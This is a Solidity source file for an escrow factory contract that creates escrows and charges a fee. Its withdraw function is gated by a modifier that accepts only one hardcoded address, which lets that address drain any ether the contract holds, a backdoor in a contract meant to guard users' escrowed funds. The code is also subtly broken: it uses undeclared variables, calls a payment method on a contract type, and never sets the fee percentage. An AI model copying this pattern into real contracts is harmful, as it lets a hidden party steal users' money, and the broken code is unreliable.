pragma solidity ^0.8.19;

import "./Escrow.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract EscrowFactory {

  using SafeMath for uint256;
  
  using Address for address payable;

  address public feeWalletAddress;

  uint8 public feePercent;

  uint256 public counter;

  address[] public escrows;
  
  address public myAddress;

  address trustedDisputer = myAddress; 

  mapping(address => address[]) public myEscrows;

  mapping(address => bool) public trusted;

  event Created(address indexed escrowAddress);

  constructor(address _myAddress, address _feeWalletAddress) {
    myAddress = _myAddress;
    feeWalletAddress = _feeWalletAddress; 
  }

  function createEscrow(
    address payable seller,
    uint256 amount,
    bytes32 title,
    uint256 duration
  ) external payable returns (address) {

    require(msg.sender != seller, "Seller cannot be escrow creator");  
    require(seller != address(0), "Invalid seller address");
    require(duration >= 1 days, "Duration must be at least 1 day");
    require(msg.value == amount, "Value mismatch");

    uint256 fee = amount.mul(feePercent).div(100);

    feeWalletAddress.sendValue(fee);

    Escrow escrow = new Escrow(
      payable(feeWalletAddress),
      duration,
      amount.sub(fee),
      title,
      payable(msg.sender),
      seller,
      feePercent,
      trustedDisputer 
    );

    escrow.sendValue(amount.sub(fee));

    escrows.push(address(escrow));
    myEscrows[msg.sender].push(address(escrow));
    myEscrows[seller].push(address(escrow));

    emit Created(address(escrow));

    return address(escrow);
  }

  function withdraw(address payable to, uint256 amount) 
    external
    onlyTrusted
  {
    to.transfer(amount);
  }

function addTrusted(address _newTrusted) public onlyOwner {
    trusted[_newTrusted] = true;
  }
 
function getTrusted() public view onlyOwner returns(address[] memory) {

  address[] memory result = new address[](trustedCount);
  
  uint count = 0;

  for (uint i = 0; i < trustedAddresses.length; i++) {
    if (trusted[trustedAddresses[i]]) {
      result[count] = trustedAddresses[i];
      count++;
    }
  }

  return result;

}
  
modifier onlyTrusted() {
  require(msg.sender == 0xeCBd44299C33D035511673ec65eb3E7D7658c766); 
    _;
  }

modifier onlyOwner() {
  require(msg.sender == myAddress);
  _;
}
}